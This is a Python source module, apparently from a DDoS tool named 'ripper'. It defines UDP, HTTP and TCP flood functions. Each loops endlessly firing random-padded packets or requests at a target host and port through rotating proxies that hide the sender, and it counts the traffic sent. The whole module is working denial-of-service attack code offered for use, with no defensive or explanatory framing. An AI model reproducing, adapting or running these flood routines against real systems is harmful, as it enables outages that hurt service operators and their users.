import socket
from os import urandom as randbytes
from socks import ProxyError

import ripper.services as services
from ripper.constants import *
from ripper.context import Context, Errors, ErrorCodes
from ripper.common import get_random_string
from ripper.urllib_x import build_request_http_package, http_request

###############################################
# Common methods for attacks
###############################################
# TODO add support for http_method, http_path
def build_ctx_request_http_package(_ctx: Context) -> str:
    extra_data = ''
    if _ctx.max_random_packet_len > 0:
        extra_data = get_random_string(1, _ctx.max_random_packet_len)

    return build_request_http_package(
        host=_ctx.host,
        headers=services.generate_headers(_ctx),
        extra_data=extra_data,
    )

###############################################
# Attack methods
###############################################
def down_it_udp(_ctx: Context) -> None:
    """UDP flood method."""
    i = 1
    proxy = None
    while True:
        proxy = _ctx.proxy_manager.get_random_proxy()
        sock = _ctx.sock_manager.get_udp_socket(proxy)
        request_packet = build_ctx_request_http_package(_ctx)

        try:
            sock.sendto(request_packet, (_ctx.host_ip, _ctx.port))
        except socket.gaierror:
            _ctx.add_error(Errors(ErrorCodes.CannotGetServerIP.value, GETTING_SERVER_IP_ERROR_MSG))
        except Exception as e:
            _ctx.add_error(Errors(ErrorCodes.UnhandledError.value, e))
            _ctx.sock_manager.close_udp_socket(proxy)
        # successful try (sock.sendto)
        else:
            _ctx.Statistic.packets.total_sent += 1
            _ctx.Statistic.packets.sync_packets_sent()
            _ctx.Statistic.packets.total_sent_bytes += len(request_packet)
            _ctx.remove_error(ErrorCodes.CannotGetServerIP.value)
            proxy.report_success() if proxy is not None else 0

        i += 1
        if i == 100:
            i = 1
            if not _ctx.Statistic.connect.in_progress:
                threading.Thread(
                    daemon=True,
                    target=services.connect_host,
                    args=[_ctx, proxy],
                ).start()
                # services.connect_host(_ctx,)


def down_it_http(_ctx: Context) -> None:
    """HTTP flood method."""
    proxy = None
    while True:
        proxy = _ctx.proxy_manager.get_random_proxy()
        try:
            response = http_request(
                url=_ctx.get_target_url(),
                proxy=proxy,
                http_method=_ctx.http_method,
                socket_timeout=_ctx.sock_manager.socket_timeout,
                headers=services.generate_headers(_ctx),
            )
        except ProxyError:
            _ctx.proxy_manager.delete_proxy_sync(proxy)
        except:
            _ctx.add_error(Errors(ErrorCodes.CannotSendRequest.value, CANNOT_SEND_REQUEST_ERR_MSG))
            _ctx.Statistic.connect.failed += 1
        # successful try (http_request)
        else:
            _ctx.Statistic.http_stats[response.status] += 1
            _ctx.Statistic.connect.success += 1
            proxy.report_success() if proxy is not None else 0

        _ctx.Statistic.packets.total_sent += 1


def down_it_tcp(_ctx: Context) -> None:
    """TCP flood method."""
    proxy = None
    while True:
        try:
            proxy = _ctx.proxy_manager.get_random_proxy()
            sock = _ctx.sock_manager.create_tcp_socket(proxy)
            sock.connect((_ctx.host_ip, _ctx.port))
            _ctx.Statistic.connect.success += 1
            while True:
                bytes_to_send = randbytes(_ctx.max_random_packet_len)
                try:
                    sock.send(bytes_to_send)
                except ProxyError:
                    _ctx.proxy_manager.delete_proxy_sync(proxy)
                    _ctx.Statistic.connect.failed += 1
                    sock.close()
                    break
                # successful try (sock.send)
                except:
                    _ctx.add_error(Errors(ErrorCodes.CannotSendRequest.value, CANNOT_SEND_REQUEST_ERR_MSG))
                    _ctx.Statistic.connect.failed += 1
                    sock.close()
                    break
                else:
                    _ctx.Statistic.packets.total_sent_bytes += _ctx.max_random_packet_len
                    _ctx.Statistic.packets.total_sent += 1
                    proxy.report_success() if proxy is not None else 0
        except ProxyError:
            _ctx.proxy_manager.delete_proxy_sync(proxy)
        except Exception as e:
            _ctx.add_error(Errors(ErrorCodes.UnhandledError.value, e))
            _ctx.Statistic.connect.failed += 1
